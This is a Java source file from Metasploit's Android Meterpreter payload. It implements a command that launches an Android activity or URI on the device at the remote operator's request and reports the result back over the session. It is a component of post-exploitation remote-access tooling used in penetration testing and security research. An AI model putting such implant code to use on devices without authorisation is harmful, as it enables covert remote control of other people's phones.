package com.metasploit.meterpreter.android;

import android.content.ActivityNotFoundException;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

import java.net.URISyntaxException;
import java.util.List;


public class activity_start_android implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_URI_STRING = TLVPacket.TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 9101);
    private static final int TLV_TYPE_ACTIVITY_START_RESULT = TLVPacket.TLV_META_TYPE_BOOL | (TLV_EXTENSIONS + 9102);
    private static final int TLV_TYPE_ACTIVITY_START_ERROR = TLVPacket.TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 9103);

    private String startIntent(Context context, String uri) {
        try {
            Intent intent = Intent.getIntent(uri);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            if (intent.getComponent() == null) {
                PackageManager pm = context.getPackageManager();
                List<ResolveInfo> resolveInfoList = pm.queryIntentActivities(intent, 0);
                if (resolveInfoList.size() >= 1) {
                    ResolveInfo resolveInfo = resolveInfoList.get(0);
                    intent.setComponent(new ComponentName(resolveInfo.activityInfo.packageName, resolveInfo.activityInfo.name));
                }
            }
            context.startActivity(intent);
            return null;
        } catch (ActivityNotFoundException e) {
            return e.getMessage();
        } catch (URISyntaxException e) {
            return e.getMessage();
        }
    }

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {

        String uri = request.getStringValue(TLV_TYPE_URI_STRING);
        final Context context = AndroidMeterpreter.getContext();
        if (context == null) {
            return ERROR_FAILURE;
        }
        String error = startIntent(context, uri);
        if (error == null) {
            response.addOverflow(TLV_TYPE_ACTIVITY_START_RESULT, true);
        } else {
            response.addOverflow(TLV_TYPE_ACTIVITY_START_RESULT, false);
            response.addOverflow(TLV_TYPE_ACTIVITY_START_ERROR, error);
        }
        return ERROR_SUCCESS;
    }
}
